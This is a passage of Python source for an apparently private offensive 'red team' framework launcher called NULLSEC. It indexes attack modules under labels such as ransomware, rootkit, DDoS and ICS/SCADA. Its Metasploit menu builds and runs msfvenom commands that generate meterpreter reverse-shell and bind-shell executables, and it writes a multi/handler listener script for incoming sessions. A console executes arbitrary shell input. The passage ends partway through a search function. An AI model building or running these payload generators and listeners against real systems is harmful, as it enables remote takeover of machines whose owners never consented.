#!/usr/bin/env python3
"""
NULLSEC FRAMEWORK (PRIVATE COPY) - Advanced Offensive Security Operations
=================================================================
Professional penetration testing and red team operations framework
Version: 2.0
GitHub: https://github.com/bad-antics/nullsec

Features:
- 185+ Attack modules with auto-discovery
- Metasploit Framework integration  
- Shodan intelligence API
- AI-powered attack automation
- Interactive console interface
- Multi-category attack coverage

Author: bad-antics development
GitHub: github.com/bad-antics
License: For authorized security testing only
"""

__version__ = "2.0"
__author__ = "bad-antics"

import os
import sys
import time
import random
import subprocess
import shlex
import shutil
import json
from pathlib import Path

# Terminal colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ATTACK_DIR = os.path.join(SCRIPT_DIR, "nullsecurity")
COMMAND_HISTORY = []

def auto_discover_modules():
    """Automatically discover all attack modules in nullsecurity/ directory"""
    discovered = []
    module_id = 1
    
    # Category detection from filename patterns
    category_patterns = {
        'Network': ['port-', 'network-', 'dns-', 'mitm-', 'arp-', 'wifi-', 'bluetooth-', 'sniffer', 'scan'],
        'Web': ['web-', 'xss-', 'sqli-', 'sql-', 'lfi-', 'rfi-', 'ssrf-', 'csrf-', 'jwt-', 'oauth-', 'ssti-', 'xxe-', 'cors-', 'csp-'],
        'Credentials': ['pass', 'hash', 'cred', 'brute', 'kerberos', 'ntlm', 'token-'],
        'Malware': ['payload', 'trojan', 'ransomware', 'rootkit', 'backdoor', 'rat-', 'c2-', 'cryptominer'],
        'Cloud': ['cloud-', 'aws-', 'azure-', 'gcp-', 's3-', 'kubernetes-', 'docker-', 'container-'],
        'Active Directory': ['ad-', 'ldap-', 'kerberoast', 'golden-ticket', 'dcsync'],
        'Database': ['database-', 'mysql-', 'postgres-', 'mssql-', 'oracle-', 'mongodb-', 'redis-', 'kafka-', 'neo4j-', 'couchdb-', 'memcached'],
        'Mobile': ['mobile-', 'android-', 'ios-', 'apk-'],
        'IoT': ['iot-', 'modbus-', 'zigbee-', 'mqtt-', 'upnp-', 'smart-', 'scada-', 'bacnet-'],
        'Exploitation': ['exploit', 'kernel-', 'rop-', 'shellcode-', 'heap-', 'buffer-', 'overflow'],
        'Evasion': ['bypass', 'amsi-', 'edr-', 'av-', 'sandbox-', 'anti-', 'deobfuscator'],
        'Persistence': ['persistence', 'backdoor', 'startup', 'bootloader'],
        'Exfiltration': ['exfil', 'tunnel', 'data-'],
        'Recon': ['recon', 'enum', 'shodan', 'osint', 'whois', 'dir-brute'],
        'Physical': ['badusb', 'camera-', 'alarm-', 'atm-', 'rfid-'],
        'OPSEC': ['darkweb', 'crypto-', 'identity-', 'evidence-', 'stego'],
        'DDoS': ['ddos', 'slowloris', 'amplify', 'flood'],
        'ICS': ['scada', 'plc-', 'power-', 'water-', 'industrial'],
        'Protocols': ['http', 'grpc-', 'websocket-', 'quic-', 'protobuf-', 'thrift-'],
        'Enterprise': ['jenkins-', 'gitlab-', 'confluence-', 'jira-', 'sharepoint-', 'checkpoint-', 'citrix-'],
        'Hardware': ['fortinet-', 'palo-alto-', 'cisco-', 'mikrotik-', 'router-'],
    }
    
    # Icon mapping based on category
    category_icons = {
        'Network': '🌐', 'Web': '🕸️', 'Credentials': '🔑', 'Malware': '🦠',
        'Cloud': '☁️', 'Active Directory': '🏢', 'Database': '🗄️', 'Mobile': '📱',
        'IoT': '🔌', 'Exploitation': '💣', 'Evasion': '🥷', 'Persistence': '🔒',
        'Exfiltration': '📤', 'Recon': '🔍', 'Physical': '💾', 'OPSEC': '🧅',
        'DDoS': '💥', 'ICS': '🏭', 'Protocols': '📡', 'Enterprise': '🏢', 'Hardware': '🔧',
        'Wireless': '📡', 'Social': '🎭',
    }
    
    try:
        if not os.path.exists(ATTACK_DIR):
            return discovered
        
        # Get all .sh files
        scripts = [f for f in os.listdir(ATTACK_DIR) if f.endswith('.sh')]
        scripts.sort()
        
        for script in scripts:
            # Determine category
            category = 'Advanced'
            for cat, patterns in category_patterns.items():
                if any(pattern in script.lower() for pattern in patterns):
                    category = cat
                    break
            
            # Get icon
            icon = category_icons.get(category, '⚡')
            
            # Create nice name from filename
            name = script.replace('.sh', '').replace('-', ' ').title()
            
            # Create description
            desc = f"{category} attack module"
            
            discovered.append({
                'id': module_id,
                'name': name,
                'icon': icon,
                'script': script,
                'desc': desc,
                'category': category
            })
            module_id += 1
    
    except Exception as e:
        print(f"{Colors.RED}[!] Error discovering modules: {e}{Colors.RESET}")
    
    return discovered

# Auto-discover all modules on startup
MODULES = auto_discover_modules()

def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    """Display NULLSEC framework banner"""
    banner = f"""{Colors.RED}
 ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
 ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
  ☠  OFFENSIVE SECURITY OPERATIONS FRAMEWORK (PRIVATE COPY)  ☠
  Advanced Attack Simulations & Red Team Operations
  ═══════════════════════════════════════════════════════════════════
  
  {Colors.YELLOW}System:{Colors.WHITE} nullsec-framework (PRIVATE COPY){Colors.CYAN}
  {Colors.GREEN}🔥 {len(MODULES)} Attack Modules {Colors.DIM}| {Colors.RED}⚡ MSF Integration {Colors.DIM}| {Colors.BLUE}🌐 Shodan API{Colors.CYAN}
  
  {Colors.DIM}Developed by {Colors.MAGENTA}bad-antics{Colors.DIM} | github.com/bad-antics{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════{Colors.RESET}
"""
    print(banner)
    # Animated loading effect
    import sys
    sys.stdout.write(f"{Colors.CYAN}  [")
    for i in range(50):
        time.sleep(0.01)
        sys.stdout.write("▓")
        sys.stdout.flush()
    sys.stdout.write(f"] {Colors.GREEN}SYSTEM READY{Colors.RESET}\n\n")
    sys.stdout.flush()

def print_menu(page=0, page_size=15):
    """Display module menu with pagination"""
    start = page * page_size
    end = min(start + page_size, len(MODULES))
    total_pages = (len(MODULES) + page_size - 1) // page_size
    
    print(f"\n{Colors.CYAN}  ═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.CYAN}    #    MODULE                       CATEGORY        DESCRIPTION{Colors.RESET}")
    print(f"{Colors.CYAN}  ═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
    
    for mod in MODULES[start:end]:
        num = f"{mod['id']:2d}"
        name = f"{mod['icon']} {mod['name']}"[:30].ljust(30)
        cat = mod['category'][:14].ljust(14)
        desc = mod['desc'][:22]
        
        color = Colors.RED if mod['category'] in ['Advanced', 'Malware', 'DDoS', 'ICS'] else \
                Colors.YELLOW if mod['category'] in ['Wireless', 'Physical'] else \
                Colors.CYAN if mod['category'] in ['Network', 'Web', 'Infrastructure'] else \
                Colors.GREEN if mod['category'] in ['Social', 'OPSEC'] else \
                Colors.MAGENTA if mod['category'] == 'Credentials' else Colors.WHITE
        
        print(f"    {Colors.RED}[{num}]{Colors.RESET} {color}{name}{Colors.RESET} {Colors.DIM}{cat}{Colors.RESET} {desc}...")
    
    print(f"{Colors.CYAN}  ═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.DIM}                        Page {page + 1}/{total_pages} ({len(MODULES)} modules){Colors.RESET}")
    
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                           COMMAND CENTER
═══════════════════════════════════════════════════════════════════════
 {Colors.YELLOW}[N]{Colors.RESET} Next Page    {Colors.YELLOW}[P]{Colors.RESET} Prev Page    {Colors.YELLOW}[A]{Colors.RESET} Run ALL      {Colors.YELLOW}[R]{Colors.RESET} Random
 {Colors.YELLOW}[C]{Colors.RESET} Categories   {Colors.YELLOW}[S]{Colors.RESET} Search       {Colors.YELLOW}[M]{Colors.RESET} Metasploit   {Colors.YELLOW}[H]{Colors.RESET} Shodan
 {Colors.YELLOW}[D]{Colors.RESET} Module List  {Colors.YELLOW}[E]{Colors.RESET} Exec Console {Colors.YELLOW}[F]{Colors.RESET} Framework    {Colors.YELLOW}[T]{Colors.RESET} Tools
 {Colors.YELLOW}[I]{Colors.RESET} AI Console   {Colors.YELLOW}[X]{Colors.RESET} Credits      {Colors.YELLOW}[Q]{Colors.RESET} Quit         {Colors.YELLOW}[1-{len(MODULES)}]{Colors.RESET} Run Module
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")

def check_command_exists(command):
    """Check if a command exists in PATH"""
    return shutil.which(command) is not None

def run_module(mod, external=False):
    """Execute an attack module with enhanced interactive framework"""
    script_path = os.path.join(ATTACK_DIR, mod['script'])
    
    if not os.path.exists(script_path):
        print(f"{Colors.RED}[!] Module not found: {script_path}{Colors.RESET}")
        time.sleep(2)
        return
    
    # Check if module has enhanced config
    config_path = script_path.replace('.sh', '.json')
    use_enhanced = os.path.exists(config_path)
    
    if use_enhanced:
        # Use enhanced interactive framework
        framework_script = os.path.join(SCRIPT_DIR, 'module-framework.py')
        if os.path.exists(framework_script):
            COMMAND_HISTORY.append(script_path)
            subprocess.run(['python3', framework_script, script_path, config_path])
            return
    
    # Fallback to standard execution
    clear_screen()
    print(f"""
{Colors.RED}═══════════════════════════════════════════════════════════════════════
  LAUNCHING ATTACK MODULE
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

  {Colors.CYAN}Module:{Colors.RESET} {mod['icon']} {mod['name']}
  {Colors.CYAN}Category:{Colors.RESET} {mod['category']}
  {Colors.CYAN}Description:{Colors.RESET} {mod['desc']}
  {Colors.CYAN}Script:{Colors.RESET} {mod['script']}

{Colors.RED}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    
    print(f"{Colors.YELLOW}[*] Executing module...{Colors.RESET}\n")
    time.sleep(0.5)
    
    if external:
        # Launch in external terminal
        terminals = ['gnome-terminal', 'xterm', 'konsole', 'xfce4-terminal']
        for term in terminals:
            if check_command_exists(term):
                if term == 'gnome-terminal':
                    subprocess.Popen([term, '--', 'bash', script_path])
                else:
                    subprocess.Popen([term, '-e', f'bash {script_path}'])
                print(f"{Colors.GREEN}[+] Launched in external terminal{Colors.RESET}")
                time.sleep(1)
                return
    
    # Run in current terminal
    COMMAND_HISTORY.append(script_path)
    subprocess.run(['bash', script_path])
    
    print(f"\n{Colors.GREEN}[✓] Module execution complete{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Press ENTER to continue...{Colors.RESET}")
    input()

def category_filter():
    """Filter modules by category"""
    categories = sorted(list(set(mod['category'] for mod in MODULES)))
    
    clear_screen()
    print_banner()
    print(f"\n{Colors.CYAN}  SELECT CATEGORY:{Colors.RESET}\n")
    
    for i, cat in enumerate(categories, 1):
        count = sum(1 for m in MODULES if m['category'] == cat)
        print(f"    {Colors.RED}[{i:2d}]{Colors.RESET} {cat} ({count} modules)")
    
    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back to main menu")
    
    choice = input(f"\n{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
    
    if choice == 'b':
        return
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(categories):
            selected_cat = categories[idx]
            filtered = [m for m in MODULES if m['category'] == selected_cat]
            
            clear_screen()
            print_banner()
            print(f"\n{Colors.CYAN}  {selected_cat.upper()} MODULES:{Colors.RESET}\n")
            
            for mod in filtered:
                print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']}")
            
            print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
            
            sub_choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
            
            if sub_choice != 'b':
                try:
                    mod_id = int(sub_choice)
                    mod = next((m for m in MODULES if m['id'] == mod_id), None)
                    if mod:
                        run_module(mod)
                except ValueError:
                    pass
    except ValueError:
        pass

def search_modules():
    """Search for modules by keyword"""
    clear_screen()
    print_banner()
    query = input(f"\n{Colors.WHITE}  Search modules: {Colors.RESET}").strip().lower()
    
    if not query:
        return
    
    results = [m for m in MODULES if query in m['name'].lower() or query in m['desc'].lower() or query in m['category'].lower()]
    
    if not results:
        print(f"\n{Colors.RED}  No modules found matching '{query}'{Colors.RESET}")
        time.sleep(1.5)
        return
    
    print(f"\n{Colors.GREEN}  Found {len(results)} modules:{Colors.RESET}\n")
    
    for mod in results:
        print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']} - {mod['desc']}")
    
    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
    
    choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
    
    if choice != 'b':
        try:
            mod_id = int(choice)
            mod = next((m for m in MODULES if m['id'] == mod_id), None)
            if mod:
                run_module(mod)
        except ValueError:
            pass

def run_all_modules():
    """Execute all modules sequentially"""
    print(f"\n{Colors.RED}[!] Executing ALL {len(MODULES)} attack modules...{Colors.RESET}")
    time.sleep(1)
    for mod in MODULES:
        run_module(mod)

def run_random_module():
    """Execute a random module"""
    mod = random.choice(MODULES)
    print(f"\n{Colors.YELLOW}[*] Random target: {mod['icon']} {mod['name']}{Colors.RESET}")
    time.sleep(0.5)
    run_module(mod)

def msf_integration():
    """Metasploit Framework integration menu"""
    clear_screen()
    print_banner()
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
  METASPLOIT FRAMEWORK INTEGRATION
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

  {Colors.RED}[1]{Colors.RESET} Launch Metasploit Console (msfconsole)
  {Colors.RED}[2]{Colors.RESET} Launch MSF Venom Payload Generator
  {Colors.RED}[3]{Colors.RESET} Search MSF Exploits
  {Colors.RED}[4]{Colors.RESET} Search MSF Auxiliary Modules
  {Colors.RED}[5]{Colors.RESET} Generate Reverse Shell (msfvenom)
  {Colors.RED}[6]{Colors.RESET} Generate Bind Shell (msfvenom)
  {Colors.RED}[7]{Colors.RESET} Multi Handler Setup
  {Colors.RED}[8]{Colors.RESET} Resource Script Generator

  {Colors.GREEN}[B]{Colors.RESET} Back to main menu

{Colors.MAGENTA}══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    
    choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip()
    
    if choice == 'b' or choice == 'B':
        return
    elif choice == '1':
        print(f"\n{Colors.GREEN}[*] Launching Metasploit Console...{Colors.RESET}")
        subprocess.run(['msfconsole'])
    elif choice == '2':
        print(f"\n{Colors.GREEN}[*] MSFVenom Payload Generator{Colors.RESET}")
        print(f"{Colors.CYAN}Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe{Colors.RESET}")
        subprocess.run(['bash'])
    elif choice == '3':
        query = input(f"\n{Colors.WHITE}  Search exploits for: {Colors.RESET}")
        subprocess.run(['msfconsole', '-q', '-x', f'search {query}; exit'])
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '4':
        query = input(f"\n{Colors.WHITE}  Search auxiliary for: {Colors.RESET}")
        subprocess.run(['msfconsole', '-q', '-x', f'search type:auxiliary {query}; exit'])
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '5':
        print(f"\n{Colors.CYAN}Generating Reverse Shell...{Colors.RESET}")
        lhost = input(f"{Colors.WHITE}  LHOST (Your IP): {Colors.RESET}")
        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
        platform = input(f"{Colors.WHITE}  Platform (windows/linux/osx): {Colors.RESET}") or "windows"
        output = input(f"{Colors.WHITE}  Output file: {Colors.RESET}") or "payload.exe"
        cmd = f"msfvenom -p {platform}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}"
        print(f"\n{Colors.GREEN}[*] Running: {cmd}{Colors.RESET}")
        subprocess.run(cmd, shell=True)
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '6':
        print(f"\n{Colors.CYAN}Generating Bind Shell...{Colors.RESET}")
        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
        platform = input(f"{Colors.WHITE}  Platform (windows/linux/osx): {Colors.RESET}") or "windows"
        output = input(f"{Colors.WHITE}  Output file: {Colors.RESET}") or "bind_payload.exe"
        cmd = f"msfvenom -p {platform}/meterpreter/bind_tcp LPORT={lport} -f exe -o {output}"
        print(f"\n{Colors.GREEN}[*] Running: {cmd}{Colors.RESET}")
        subprocess.run(cmd, shell=True)
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '7':
        print(f"\n{Colors.CYAN}Multi Handler Setup{Colors.RESET}")
        lhost = input(f"{Colors.WHITE}  LHOST: {Colors.RESET}")
        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
        payload = input(f"{Colors.WHITE}  Payload: {Colors.RESET}") or "windows/meterpreter/reverse_tcp"
        cmd = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'"
        subprocess.run(cmd, shell=True)
    elif choice == '8':
        print(f"\n{Colors.CYAN}Resource Script Generator{Colors.RESET}")
        script_content = """use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z
"""
        with open("/tmp/nullsec_handler.rc", "w") as f:
            f.write(script_content)
        print(f"{Colors.GREEN}[+] Created: /tmp/nullsec_handler.rc{Colors.RESET}")
        print(f"{Colors.CYAN}Run with: msfconsole -r /tmp/nullsec_handler.rc{Colors.RESET}")
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")

def shodan_search():
    """Launch Shodan search interface"""
    script_path = os.path.join(ATTACK_DIR, 'shodan-search.sh')
    if os.path.exists(script_path):
        subprocess.run(['bash', script_path])
    else:
        print(f"{Colors.RED}[!] Shodan module not found{Colors.RESET}")
    print(f"\n{Colors.YELLOW}[*] Press ENTER to continue...{Colors.RESET}")
    input()

def command_console():
    """Interactive command execution console"""
    clear_screen()
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                      NULLSEC COMMAND CONSOLE
               Execute Any Script or Application
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.YELLOW}Features:{Colors.RESET}
  • Execute any shell command
  • Run external scripts (.sh, .py, .pl, .rb, .js)
  • Automatic dependency checking
  • Command history tracking

{Colors.YELLOW}Commands:{Colors.RESET}
  {Colors.GREEN}exec <command>{Colors.RESET}    - Execute shell command
  {Colors.GREEN}run <script>{Colors.RESET}      - Run external script
  {Colors.GREEN}shodan{Colors.RESET}            - Launch Shodan intelligence browser
  {Colors.GREEN}history{Colors.RESET}           - Show command history
  {Colors.GREEN}clear{Colors.RESET}             - Clear screen
  {Colors.GREEN}exit{Colors.RESET}              - Return to main menu

{Colors.DIM}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    
    while True:
        try:
            cmd = input(f"{Colors.RED}nullsec{Colors.DIM}@{Colors.CYAN}exec{Colors.RESET} > ").strip()
            
            if not cmd:
                continue
            
            if cmd == 'exit':
                break
            elif cmd == 'clear':
                clear_screen()
            elif cmd == 'shodan':
                shodan_search()
            elif cmd == 'history':
                if COMMAND_HISTORY:
                    print(f"\n{Colors.CYAN}Command History:{Colors.RESET}")
                    for i, h_cmd in enumerate(COMMAND_HISTORY[-20:], 1):
                        print(f"  {Colors.DIM}{i}.{Colors.RESET} {h_cmd}")
                else:
                    print(f"{Colors.YELLOW}[*] No command history{Colors.RESET}")
            elif cmd.startswith('exec '):
                command = cmd[5:]
                COMMAND_HISTORY.append(command)
                subprocess.run(command, shell=True)
            elif cmd.startswith('run '):
                script_path = cmd[4:].strip()
                if os.path.exists(script_path):
                    COMMAND_HISTORY.append(script_path)
                    subprocess.run(['bash', script_path])
                else:
                    print(f"{Colors.RED}[!] Script not found: {script_path}{Colors.RESET}")
            else:
                COMMAND_HISTORY.append(cmd)
                subprocess.run(cmd, shell=True)
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Use 'exit' to quit{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

def launch_ai_console():
    """Launch NULLSEC AI assistant"""
    ai_script = os.path.join(SCRIPT_DIR, 'nullsec-ai.py')
    if os.path.exists(ai_script):
        subprocess.run(['python3', ai_script])
    else:
        print(f"{Colors.RED}[!] AI module not found{Colors.RESET}")
        time.sleep(2)

def detailed_module_browser():
    """Detailed module browser with full descriptions and launch options"""
    while True:
        clear_screen()
        print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    NULLSEC MODULE BROWSER v3.0
              Individual Module Selection with Full Descriptions
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.YELLOW}Browse By:{Colors.RESET}
  {Colors.RED}[1]{Colors.RESET} View All Modules (Full List)
  {Colors.RED}[2]{Colors.RESET} Browse by Category
  {Colors.RED}[3]{Colors.RESET} Search by Name/Description
  {Colors.RED}[4]{Colors.RESET} Recently Used Modules
  {Colors.RED}[5]{Colors.RESET} Enhanced Modules (with JSON configs)

{Colors.YELLOW}Launch Options:{Colors.RESET}
  {Colors.RED}[6]{Colors.RESET} Desktop GUI Launcher
  {Colors.RED}[7]{Colors.RESET} CLI Framework (Enhanced)
  {Colors.RED}[8]{Colors.RESET} Direct Execution (Standard)

{Colors.YELLOW}Quick Access:{Colors.RESET}
  {Colors.RED}[9]{Colors.RESET} Network Modules
  {Colors.RED}[10]{Colors.RESET} Web Exploitation
  {Colors.RED}[11]{Colors.RESET} Credential Attacks
  {Colors.RED}[12]{Colors.RESET} Active Directory
  {Colors.RED}[13]{Colors.RESET} Cloud & Container
  {Colors.RED}[14]{Colors.RESET} IoT & ICS/SCADA

  {Colors.GREEN}[B]{Colors.RESET} Back to Main Menu

{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
        
        choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
        
        if choice == 'b':
            break
        elif choice == '1':
            view_all_modules_detailed()
        elif choice == '2':
            browse_by_category_detailed()
        elif choice == '3':
            search_modules_detailed()
        elif choice == '4':
            show_recent_modules()
        elif choice == '5':
            show_enhanced_modules()
        elif choice == '6':
            launch_desktop_gui()
        elif choice == '7':
            launch_cli_framework()
        elif choice == '8':
            print(f"\n{Colors.CYAN}[*] Direct execution uses standard bash execution without framework{Colors.RESET}")
            input(f"{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '9':
            browse_category_modules('Network')
        elif choice == '10':
            browse_category_modules('Web')
        elif choice == '11':
            browse_category_modules('Credentials')
        elif choice == '12':
            browse_category_modules('Active Directory')
        elif choice == '13':
            browse_category_modules('Cloud')
        elif choice == '14':
            browse_category_modules('IoT')
        else:
            print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")
            time.sleep(1)

def view_all_modules_detailed():
    """Display all modules with full descriptions"""
    page = 0
    page_size = 10
    total_pages = (len(MODULES) + page_size - 1) // page_size
    
    while True:
        clear_screen()
        start = page * page_size
        end = min(start + page_size, len(MODULES))
        
        print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    ALL MODULES - DETAILED VIEW
                        Page {page + 1}/{total_pages}
═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
        
        for i, mod in enumerate(MODULES[start:end], start + 1):
            config_exists = os.path.exists(os.path.join(ATTACK_DIR, mod['script'].replace('.sh', '.json')))
            enhanced = f"{Colors.GREEN}[Enhanced]{Colors.RESET}" if config_exists else f"{Colors.DIM}[Standard]{Colors.RESET}"
            
            print(f"""
{Colors.RED}[{mod['id']}]{Colors.RESET} {mod['icon']} {Colors.BOLD}{mod['name']}{Colors.RESET} {enhanced}
    {Colors.CYAN}Category:{Colors.RESET} {mod['category']}
    {Colors.CYAN}Description:{Colors.RESET} {mod['desc']}
    {Colors.CYAN}Script:{Colors.RESET} {mod['script']}
{Colors.DIM}───────────────────────────────────────────────────────────────────────{Colors.RESET}""")
        
        print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
 {Colors.YELLOW}[N]{Colors.RESET} Next Page  {Colors.YELLOW}[P]{Colors.RESET} Previous  {Colors.YELLOW}[1-{len(MODULES)}]{Colors.RESET} Launch Module  {Colors.YELLOW}[B]{Colors.RESET} Back
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
        
        choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
        
        if choice == 'b':
            break
        elif choice == 'n':
            page = (page + 1) % total_pages
        elif choice == 'p':
            page = (page - 1) % total_pages
        else:
            try:
                mod_id = int(choice)
                mod = next((m for m in MODULES if m['id'] == mod_id), None)
                if mod:
                    launch_module_with_options(mod)
            except ValueError:
                pass

def browse_by_category_detailed():
    """Browse modules organized by category"""
    # Group modules by category
    categories = {}
    for mod in MODULES:
        cat = mod['category']
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(mod)
    
    while True:
        clear_screen()
        print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    BROWSE BY CATEGORY
═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
        
        sorted_cats = sorted(categories.keys())
        for i, cat in enumerate(sorted_cats, 1):
            count = len(categories[cat])
            icon = '🌐' if 'Network' in cat else '🕸️' if 'Web' in cat else '🔑' if 'Credential' in cat else '💣'
            print(f"  {Colors.RED}[{i:2d}]{Colors.RESET} {icon} {Colors.CYAN}{cat}{Colors.RESET} {Colors.DIM}({count} modules){Colors.RESET}")
        
        print(f"\n  {Colors.GREEN}[B]{Colors.RESET} Back to Browser\n")
        print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
        
        choice = input(f"{Colors.WHITE}  Select category: {Colors.RESET}").strip().lower()
        
        if choice == 'b':
            break
        else:
            try:
                cat_idx = int(choice) - 1
                if 0 <= cat_idx < len(sorted_cats):
                    browse_category_modules(sorted_cats[cat_idx])
            except ValueError:
                pass

def browse_category_modules(category):
    """Show all modules in a specific category"""
    cat_modules = [m for m in MODULES if m['category'] == category]
    
    if not cat_modules:
        print(f"\n{Colors.RED}[!] No modules found in category: {category}{Colors.RESET}")
        time.sleep(2)
        return
    
    page = 0
    page_size = 10
    total_pages = (len(cat_modules) + page_size - 1) // page_size
    
    while True:
        clear_screen()
        start = page * page_size
        end = min(start + page_size, len(cat_modules))
        
        print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    {category.upper()} MODULES
                    {len(cat_modules)} modules - Page {page + 1}/{total_pages}
═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
        
        for mod in cat_modules[start:end]:
            config_exists = os.path.exists(os.path.join(ATTACK_DIR, mod['script'].replace('.sh', '.json')))
            enhanced = f"{Colors.GREEN}✓{Colors.RESET}" if config_exists else f"{Colors.DIM}○{Colors.RESET}"
            
            print(f"""
{Colors.RED}[{mod['id']:3d}]{Colors.RESET} {enhanced} {mod['icon']} {Colors.BOLD}{mod['name']}{Colors.RESET}
      {Colors.DIM}{mod['desc']}{Colors.RESET}
""")
        
        print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
        print(f" {Colors.YELLOW}[N]{Colors.RESET} Next  {Colors.YELLOW}[P]{Colors.RESET} Previous  {Colors.YELLOW}[1-{len(MODULES)}]{Colors.RESET} Launch  {Colors.YELLOW}[B]{Colors.RESET} Back")
        print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
        
        choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
        
        if choice == 'b':
            break
        elif choice == 'n':
            page = (page + 1) % total_pages
        elif choice == 'p':
            page = (page - 1) % total_pages
        else:
            try:
                mod_id = int(choice)
                mod = next((m for m in MODULES if m['id'] == mod_id), None)
                if mod:
                    launch_module_with_options(mod)
            except ValueError:
                pass

def search_modules_detailed():
    """Search modules with detailed results"""
    clear_screen()
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                        MODULE SEARCH
═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    
    query = input(f"\n{Colors.WHITE}  Search (name/description/category): {Colors.RESET}").strip().lower()
    
    if not query:
        return
    
    results = [m for m in MODULES if query in m['name'].lower() or 
               query in m['desc'].lower() or query in m['category'].lower() or
               query in m['script'].lower()]
    
    if not results:
        print(f"\n{Colors.RED}[!] No modules found matching '{query}'{Colors.RESET}")
        time.sleep(2)
        return
    
    while True:
        clear_screen()
        print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    SEARCH RESULTS: "{query}"
                    Found {len(results)} modules
═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
        
        for mod in results[:15]:  # Show first 15 results
            config_exists = os.path.exists(os.path.join(ATTACK_DIR, mod['script'].replace('.sh', '.json')))
